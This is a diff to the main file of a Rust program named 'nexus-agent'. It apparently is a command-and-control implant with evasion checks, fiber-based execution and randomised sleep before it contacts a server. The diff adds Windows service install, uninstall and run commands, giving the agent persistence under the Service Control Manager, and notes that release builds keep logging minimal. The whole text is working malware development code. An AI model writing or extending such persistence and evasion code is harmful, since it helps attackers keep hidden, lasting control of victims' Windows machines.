@@ -29,12 +29,59 @@ mod system;
 #[cfg(target_os = "windows")]
 mod fiber_execution;
 
+#[cfg(target_os = "windows")]
+mod svc;
+
 use agent::NexusAgent;
 use communication::NetworkClient;
 use evasion::EnvironmentChecker;
 
-#[tokio::main]
-async fn main() -> Result<()> {
+fn main() {
+    let args: Vec<String> = env::args().collect();
+
+    // Handle service subcommands synchronously before any async runtime is
+    // constructed.  --run-service is invoked by the SCM and must call
+    // service_dispatcher::start() on the main thread without a live Tokio
+    // runtime above it.
+    #[cfg(target_os = "windows")]
+    match args.get(1).map(|s| s.as_str()) {
+        Some("--install") => {
+            if let Err(e) = svc::install() {
+                eprintln!("[nexus-agent] install failed: {}", e);
+                std::process::exit(1);
+            }
+            return;
+        }
+        Some("--uninstall") => {
+            if let Err(e) = svc::uninstall() {
+                eprintln!("[nexus-agent] uninstall failed: {}", e);
+                std::process::exit(1);
+            }
+            return;
+        }
+        Some("--run-service") => {
+            if let Err(e) = svc::run() {
+                eprintln!("[nexus-agent] service dispatcher failed: {}", e);
+                std::process::exit(1);
+            }
+            return;
+        }
+        _ => {}
+    }
+
+    // Standard foreground agent path.
+    let rt = tokio::runtime::Builder::new_multi_thread()
+        .enable_all()
+        .build()
+        .expect("failed to build tokio runtime");
+
+    if let Err(e) = rt.block_on(run_agent(args)) {
+        #[cfg(debug_assertions)]
+        eprintln!("Agent error: {}", e);
+    }
+}
+
+async fn run_agent(args: Vec<String>) -> Result<()> {
     // Initialize logging (in release mode, this should be minimal or disabled)
     #[cfg(debug_assertions)]
     env_logger::init();
@@ -49,8 +96,6 @@ async fn main() -> Result<()> {
     let jitter = rand::random::<u64>() % 30 + 10;
     sleep(Duration::from_secs(jitter)).await;
 
-    // Parse command line arguments
-    let args: Vec<String> = env::args().collect();
     let server_addr = if args.len() > 1 {
         args[1].clone()
     } else {
